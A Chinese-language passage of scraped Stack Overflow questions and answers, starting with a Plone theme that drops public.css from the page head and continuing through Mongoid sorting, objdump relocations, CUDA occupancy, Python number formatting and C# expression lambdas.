  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/member.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/base.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/collective.js.jqueryui.custom.min.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/columns.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/authoring.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/portlets.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/controlpanel.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/deprecated.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/navtree.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/invisibles.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/forms.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/++resource++plone.app.discussion.stylesheets/discussion.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/ploneKss.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/++resource++tinymce.stylesheets/tinymce.css" />
  <link rel="stylesheet" type="text/css" media="print" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/print.css" />
  <link rel="stylesheet" type="text/css" media="handheld, screen and (max-device-width: 480px)" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/mobile.css" />
  <!--[if lt IE 8]> <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/IEFixes.css" /> <![endif]-->
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/++theme++myproject.theme/css/sunburst.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/++theme++myproject.theme/css/main.css" />
  <link rel="stylesheet" type="text/css" media="all" href="http://localhost:8080/my-project/portal_css/Sunburst%20Theme/ploneCustom.css" />
  <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://localhost:8080/my-project/portal_kss/Sunburst%20Theme/++resource++tinymce.kss/tinymce.kss" />
  <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://localhost:8080/my-project/portal_kss/Sunburst%20Theme/at.kss" />
  <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://localhost:8080/my-project/portal_kss/Sunburst%20Theme/plone.kss" />
  <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://localhost:8080/my-project/portal_kss/Sunburst%20Theme/++resource++plone.app.form.kss" />
  <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://localhost:8080/my-project/portal_kss/Sunburst%20Theme/++resource++plone.app.z3cform" />
  <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://localhost:8080/my-project/portal_kss/Sunburst%20Theme/ploneformgen.kss" />
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquery.js"></script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/jquery-integration.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquerytools.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquerytools.overlayhelpers.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquerytools.form.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/register_function.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/plone_javascript_variables.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/nodeutilities.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/cookie_functions.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/modernizr.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/livesearch.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++search.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/select_all.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/dragdropreorder.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/collapsiblesections.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/form_tabbing.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/popupforms.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/jquery.highlightsearchterms.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/first_input_focus.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/accessibility.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/styleswitcher.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/toc.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/collapsibleformfields.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.discussion.javascripts/comments.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/dropdown.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/sarissa.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/table_sorter.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/calendar_formfield.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/formUnload.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/formsubmithelpers.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/unlockOnFormUnload.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/tiny_mce.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++kukit.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/tiny_mce_init.js"> </script>
  <script type="text/javascript" src="http://localhost:8080/my-project/portal_javascripts/Sunburst%20Theme/collective.js.jqueryui.custom.min.js"> </script>
  <link rel="author" href="http://localhost:8080/my-project/author/admin" title="Autoreninformation" />
  <link rel="shortcut icon" type="image/x-icon" href="http://localhost:8080/my-project/favicon.ico" />
  <link rel="apple-touch-icon" href="http://localhost:8080/my-project/touch_icon.png" />
  <script type="text/javascript">

        jQuery(function($){
            $.datepicker.setDefaults(
                jQuery.extend($.datepicker.regional['de'],
                {dateFormat: 'dd.mm.yy'}));
        });
        </script>
  <link rel="search" href="http://localhost:8080/my-project/@@search" title="Website durchsuchen" />
</head> 
```

在这里，我的主题被禁用：

```
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <base href="http://127.0.0.1:8080/my-project/front-page" /><!--[if lt IE 7]></base><![endif]-->
    <meta content="Herzlichen Glückwunsch! Sie haben das professionelle Open-Source Content-Management-System Plone erfolgreich installiert." name="description" />
    <link rel="alternate" data-kss-base-url="kss-base-url" href="http://127.0.0.1:8080/my-project/front-page/" />

    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/member.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/base.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/public.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/collective.js.jqueryui.custom.min.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/columns.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/authoring.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/portlets.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/controlpanel.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/deprecated.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/navtree.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/invisibles.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/forms.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/++resource++plone.app.discussion.stylesheets/discussion.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/ploneKss.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/++resource++tinymce.stylesheets/tinymce.css" />
    <link rel="stylesheet" type="text/css" media="print" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/print.css" />
    <link rel="stylesheet" type="text/css" media="handheld, screen and (max-device-width: 480px)" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/mobile.css" />
    <!--[if lt IE 8]>    <link rel="stylesheet" type="text/css" media="screen" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/IEFixes.css" /> <![endif]-->

    <link rel="stylesheet" type="text/css" media="all" href="http://127.0.0.1:8080/my-project/portal_css/Sunburst%20Theme/ploneCustom.css" />
    <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://127.0.0.1:8080/my-project/portal_kss/Sunburst%20Theme/++resource++tinymce.kss/tinymce.kss" />
    <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://127.0.0.1:8080/my-project/portal_kss/Sunburst%20Theme/at.kss" />
    <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://127.0.0.1:8080/my-project/portal_kss/Sunburst%20Theme/plone.kss" />
    <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://127.0.0.1:8080/my-project/portal_kss/Sunburst%20Theme/++resource++plone.app.form.kss" />
    <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://127.0.0.1:8080/my-project/portal_kss/Sunburst%20Theme/++resource++plone.app.z3cform" />
    <link rel="stylesheet" data-rel="kinetic-stylesheet" type="text/kss" href="http://127.0.0.1:8080/my-project/portal_kss/Sunburst%20Theme/ploneformgen.kss" />

    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquery.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/jquery-integration.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquerytools.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquerytools.overlayhelpers.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.jquerytools.form.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/register_function.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/plone_javascript_variables.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/nodeutilities.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/cookie_functions.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/modernizr.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/livesearch.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++search.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/select_all.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/dragdropreorder.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/collapsiblesections.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/form_tabbing.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/popupforms.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/jquery.highlightsearchterms.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/first_input_focus.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/accessibility.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/styleswitcher.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/toc.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/collapsibleformfields.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++plone.app.discussion.javascripts/comments.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/dropdown.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/sarissa.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/table_sorter.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/calendar_formfield.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/formUnload.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/formsubmithelpers.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/unlockOnFormUnload.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/tiny_mce.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/++resource++kukit.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/tiny_mce_init.js"></script>
    <script type="text/javascript" src="http://127.0.0.1:8080/my-project/portal_javascripts/Sunburst%20Theme/collective.js.jqueryui.custom.min.js"></script>

    <title>Willkommen bei Plone &mdash; My-Project</title>
    <link rel="author" href="http://127.0.0.1:8080/my-project/author/admin" title="Autoreninformation" />
    <link rel="shortcut icon" type="image/x-icon" href="http://127.0.0.1:8080/my-project/favicon.ico" />
    <link rel="apple-touch-icon" href="http://127.0.0.1:8080/my-project/touch_icon.png" />
    <script type="text/javascript">
        jQuery(function($){
            $.datepicker.setDefaults(
                jQuery.extend($.datepicker.regional['de'],
                {dateFormat: 'dd.mm.yy'}));
        });
    </script>
    <link rel="search" href="http://127.0.0.1:8080/my-project/@@search" title="Website durchsuchen" />
    <meta name="viewport" content="width=device-width, initial-scale=0.6666, maximum-scale=1.0, minimum-scale=0.6666" />
    <meta name="generator" content="Plone - http://plone.org" />
</head> 
```

明显的区别是第一个块中缺少指向 public.css 的链接标记。为什么？有什么建议，我必须在哪里寻找这个错误的来源？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:49:41.617

马丁书的第 158 页包括：

> 如果我们想在主题生效时选择性地关闭一些 Plone 样式表，我们可以添加一个标签，例如：

```
<stylesheet id="public.css"
    expression="not:request/HTTP_X_THEME_ENABLED | nothing"
    /> 
```

也许您在实验中使用了该代码并且该设置仍保留在您的数据库中？在 ZMI 中，转到`portal_css`工具并确保条件字段为空`public.css`。

# ruby - 按两个字段排序 mongoid

> ID：11735030
> 
> 赞同：2
> 
> 时间：2012-07-31T07:17:55.673
> 
> 标签：ruby, mongoid

我有一个包含两个整数字段的对象报告：月和年。我需要按“日期”排序

```
Report.desc(:year).desc(:month).each do |a|
puts a.year.to_s + " " + a.month.to_s
end 
```

结果：

```
2011 12
2011 11
2012 7
2012 6
2012 5
2012 4
2012 3
2012 2
2012 1 
```

虽然我想得到

```
2012 7
2012 6
2012 5
2012 4
2012 3
2012 2
2012 1
2011 12
2011 11 
```

我究竟做错了什么？

Mongoid 标准如下所示：

```
irb(main):043:0> Report.desc(:year).desc(:month)

    => #<Mongoid::Criteria
       selector: {},
       options:  {:sort=>{"year"=>-1, "month"=>-1}},
       class:    Report,
       embedded: true> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T07:22:03.943

您获得的结果仅按月份排序，而不是按整个日期排序（因此您得到的结果）。也许将 sort_by 方法与同时考虑到年份和月份的主体一起使用？就像是：

```
Report.sort_by{|t| [-t.year, -t.month]} 
```

编辑：我使用年份和月份的负数来实现降序。

# objdump - objdump 如何处理全局变量

> ID：11735031
> 
> 赞同：0
> 
> 时间：2012-07-31T07:17:57.693
> 
> 标签：objdump

我制作了以下虚拟代码进行测试

/tmp/test.c 包含以下内容：

```
#include "test.h"
#include <stdio.h>
#include <stdlib.h>
struct s* p;
unsigned char *c;

void main(int argc, char ** argv) {
   memset(c, 0, 10);
   p->a = 10;
   p->b = 20;
} 
```

/tmp/test.h 包含以下内容：

```
struct s {
    int a;
    int b;
}; 
```

我编译并运行 objdump 如下：

cd /tmp gcc -c test.c -o test.o objdump -gdsMIntel test.o

我得到以下输出：

```
test.o:     file format elf32-i386

Contents of section .text:
 0000 5589e5a1 00000000 c7000000 0000c740  U..............@
 0010 04000000 0066c740 080000a1 00000000  .....f.@........
 0020 c7000a00 0000a100 000000c7 40041400  ............@...
 0030 00005dc3                             ..].            
Contents of section .comment:
 0000 00474343 3a202855 62756e74 752f4c69  .GCC: (Ubuntu/Li
 0010 6e61726f 20342e36 2e332d31 7562756e  naro 4.6.3-1ubun
 0020 74753529 20342e36 2e3300             tu5) 4.6.3\.     
Contents of section .eh_frame:
 0000 14000000 00000000 017a5200 017c0801  .........zR..|..
 0010 1b0c0404 88010000 1c000000 1c000000  ................
 0020 00000000 34000000 00410e08 8502420d  ....4....A....B.
 0030 05700c04 04c50000                    .p......        

Disassembly of section .text:

00000000 <main>:
   0:   55                      push   ebp
   1:   89 e5                   mov    ebp,esp
   3:   a1 00 00 00 00          mov    eax,ds:0x0 ;;;; should be the address of unsigned char *c
   8:   c7 00 00 00 00 00       mov    DWORD PTR [eax],0x0 ;;;; setting 10 bytes to 0
   e:   c7 40 04 00 00 00 00    mov    DWORD PTR [eax+0x4],0x0
  15:   66 c7 40 08 00 00       mov    WORD PTR [eax+0x8],0x0
  1b:   a1 00 00 00 00          mov    eax,ds:0x0
  20:   c7 00 0a 00 00 00       mov    DWORD PTR [eax],0xa ;;;; p->a = 10;
  26:   a1 00 00 00 00          mov    eax,ds:0x0
  2b:   c7 40 04 14 00 00 00    mov    DWORD PTR [eax+0x4],0x14 ;;;; p->b = 20;
  32:   5d                      pop    ebp
  33:   c3                      ret 
```

在上面的反汇编中，我发现：

在 c 的情况下，执行以下操作：

```
mov eax, ds:0x0
mov DWORD PTR [eax], 0 
```

在 p->a 的情况下，执行以下操作：

```
mov    eax, ds:0x0
mov    DWORD PTR [eax],0x0 
```

在这种情况下，c 和 p->a 是否都位于同一地址 (ds:0x0)？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T16:54:35.053

.o 文件还不能执行，会有重定位条目指向链接器稍后将修复的那些 0。由于您的源文件似乎大部分是独立的，您可以删除 -c 标志以生成（完全链接的）可执行文件而不是可重定位的目标文件吗？

# silverlight - Silverlight 将网络摄像头图像保存到服务器文件夹中

> ID：11735032
> 
> 赞同：0
> 
> 时间：2012-07-31T07:18:00.400
> 
> 标签：silverlight

我创建了一个 silverlight 项目，它通过网络摄像头捕获图像并将其存储在我的本地硬盘中，但我不想将其保存在本地硬盘上，我想将其存储在我的项目文件夹中，然后将路径存储在 SQL 数据库中.

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T11:11:39.687

您可以尝试将图像直接作为比特流保存到数据库吗？

```
private static ImageElementContract ImageToImageElementContract(Image image)
    {
        WriteableBitmap bmp = new WriteableBitmap(image, null);
        ImageTools.ExtendedImage myImage = new ImageTools.ExtendedImage();
        myImage = ImageExtensions.ToImage(bmp);

        MemoryStream mStream = new MemoryStream();

        JpegEncoder encoder = new JpegEncoder();
        encoder.Quality = 100;
        encoder.Encode(myImage, mStream);
        imageContract.ImageStream = mStream.ToArray();
        return imageContract;
    } 
```

应该给你一个流，如果你再次需要它，你可以将它传递给数据库并重新组合在一起。很难说你用它做什么。你的问题没有太多细节

# iphone - 单击每一行时如何设置导航的标题？

> ID：11735033
> 
> 赞同：1
> 
> 时间：2012-07-31T07:17:59.957
> 
> 标签：iphone, objective-c, ios

你好朋友我是 TableView 的新手.....我需要帮助..请

当我单击每一行时，我必须在导航栏上设置标题我应该在导航栏上获得相同的行名......朋友我的表中有 23 行，所以请建议我解决我的问题请......

谢谢和雷加

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:42:09.473

在`tableView:didSelectRowForIndexPath:`中，编写以下代码：

```
self.title = [NSString stringWithFormat:@"Cell%d",indexPath.row]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:22:39.730

试试看。`self.title = nameoftherow; [self.view setNeedsDisplay];`_`tableView:didSelectRowForIndexPath:`

# cuda - 了解占用计算器

> ID：11735035
> 
> 赞同：4
> 
> 时间：2012-07-31T07:18:06.907
> 
> 标签：cuda, calculator

我无法理解占用率计算器。我在一些开发代码中遇到问题，其中 512 个线程工作正常，但 1024 个线程给出了糟糕的数字。

我在 Windows 7 上运行 Tesla C2050，在 Matlab 中开发（这不是我的错，我必须使用 Matlab）和 Mexfunction。

我想我会尝试使用占用计算器来尝试找到影响结果的代码的任何其他限制。

当我每个块输入 1024 个线程时，占用率为 0%。使用 512 个线程，占用率为 33%。我原以为我至少会得到 1024 个线程的东西。我注意到代码和占用计算器最多可以为 704 个线程提供良好的结果（这是一个不代表任何真实的数字）。

我相信我对这方面缺乏了解是我无法纠正我在代码中看到的错误的原因。谁能解释为什么我会得到这些结果？

数字是：

*   计算能力 2.0
*   共享内存大小 49152
*   每块 512 或 1024 个线程
*   每个线程的寄存器 44
*   每块共享内存 0

ptxas 信息：使用了 44 个寄存器，232 字节 cmem[0]，144 字节 cmem[2]，28 字节 cmem[16]

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T07:45:47.490

每个块拥有的寄存器总数为 32768（您可以使用 SDK 中的 deviceQuery 进行检查）。现在根据您的内核，它使用 44 个寄存器/线程。如果您以每块 1024 个线程启动内核，您将获得总共 44*1024 = 45056 个寄存器，这超出了限制。为了以每块 1024 个线程运行它，您需要优化内核以使每个线程使用不超过 32 个寄存器。

# c# - C# vs Fast 报错

> ID：11735036
> 
> 赞同：0
> 
> 时间：2012-07-31T07:18:07.763
> 
> 标签：c#

> **可能重复：**
> [快速报告错误](https://stackoverflow.com/questions/11716970/fast-report-error)

我有快速 report.net DEMO，它链接到我的 C# 2010。当我尝试将报告从工具箱拖到 Windows 应用程序上时，它给了我以下错误：

FastReport 中不存在类型或命名空间报告。

我该如何解决这个问题？

我尝试添加快速报告的 .dll 引用，但它仍然给我这个错误。可能是因为我正在使用 Fast Report.net 演示，或者我正在使用什么代码。

请有人帮助我:-(

# python - 在python中，有没有一种简单的方法可以将带逗号的数字转换为整数，然后再返回带逗号的数字？

> ID：11735037
> 
> 赞同：4
> 
> 时间：2012-07-31T07:18:08.477
> 
> 标签：python, string, math

假设我有一个这样的数字：

**8,741**或**8,741,291**

如何使用 python 将该数字乘以 2，然后将逗号放回其中？我希望python函数返回

**17,482 和 17,482,582**，以字符串格式。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-31T07:30:11.473

```
my_str = '1,255,000'

my_num = int(my_str.replace(',','')) #replace commas with nothing 
```

这将返回 my_num = 1255000

```
result = my_num * 2

import locale
locale.setlocale(locale.LC_ALL, 'en_US')
my_str = locale.format("%d", result, grouping=True) 
```

这将返回->my_str='2,510,000'

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-31T07:27:34.223

第一部分很简单：

```
temp = "8,741,291".replace(',', '')
n = int(temp) * 2 
```

我认为找回逗号有点困难，但事实并非如此！

如果您使用的是最新版本的 Python，您可以使用新的`.format()`字符串方法，如下所示：

```
s = "{0:,}".format(n) 
```

如果您使用的是比 2.6 更新的 Python，则可以`0`在此示例中省略花括号中的 。（唉，我必须使用 Cygwin，唉，它只提供 2.6，所以我习惯于输入`0`.）

该方法的规范迷你语言在`.format()`这里：

[http://docs.python.org/library/string.html#formatstrings](http://docs.python.org/library/string.html#formatstrings)

@user1474424 解释了这个`locale.format()`功能，很酷；我不知道那个。我检查了文档；这从 Python 1.5 就已经存在了！

[http://docs.python.org/library/locale.html](http://docs.python.org/library/locale.html)

# c# - 返回委托的 Lambda 表达式

> ID：11735043
> 
> 赞同：6
> 
> 时间：2012-07-31T07:18:28.720
> 
> 标签：c#, .net, delegates, lambda, expression

嗨，我正在努力实现这样的目标；

```
Method<TObjectType>(m=>m.GetData); //m is the instance of TObjectType 
```

如果我能成功，那么我可以访问这个表达式并获取 GetData 方法并将其用于创建动态 sql 查询。我可以通过将方法名称作为字符串给出来做到这一点，但是我不想破坏我的开发者朋友的强类型世界。

我知道我必须给出代表的确切定义，但这仍然对我没有帮助；

```
void Method<TObjectType>(Expression<Func<TObjectType, Delegate>> ex){/**/} 
```

你有想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T07:30:34.877

不幸的是，几乎没有“代表”这样的东西。对于大多数目的（尤其是：解析 a `MethodInfo`），它必须是强类型委托。这是因为`GetData`不是*方法*，而是*方法组*。你真的需要精确地指定方法，或者有一个已知的委托类型（最终做同样的事情）。

你有两个实用的选择；工作`object`，或添加一个通用的。例如：

```
void Method<TObjectType>(Expression<Func<TObjectType,object>> ex) {...} 
```

会起作用，就像：

```
void Method<TObjectType, TValue>(Expression<Func<TObjectType,TValue>> ex) {...} 
```

调用者将使用：

```
Method<Foo>(x => x.GetData()); 
```

* * *

如果你**真的**想使用委托，那么类型必须是可预测的，例如：

```
void Method<TObjectType>(Expression<Func<TObjectType,Func<int>>> ex) 
```

允许：

```
Method<Foo>(x => x.GetData); 
```

或者，如果您知道（例如）该方法始终是无参数的，但您不知道返回类型；也许是这样的：

```
void Method<TObjectType, TValue>(Expression<Func<TObjectType,Func<TValue>>> ex) 
```

这使得：

```
Method<Foo, int>(x => x.GetData); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:29:18.203

你在寻找这样的东西吗？

```
object InvokeMethod(Delegate method, params object[] args){
    return method.DynamicInvoke(args);
}

int Add(int a, int b){
    return a + b;
}

void Test(){
    Console.WriteLine(InvokeMethod(new Func<int, int, int>(Add), 5, 4));
} 
```

# java - 从 Java Http Server 向 jQuery 写入响应

> ID：11735047
> 
> 赞同：-1
> 
> 时间：2012-07-31T07:18:36.113
> 
> 标签：java, jquery, ajax, http, ibm-midrange

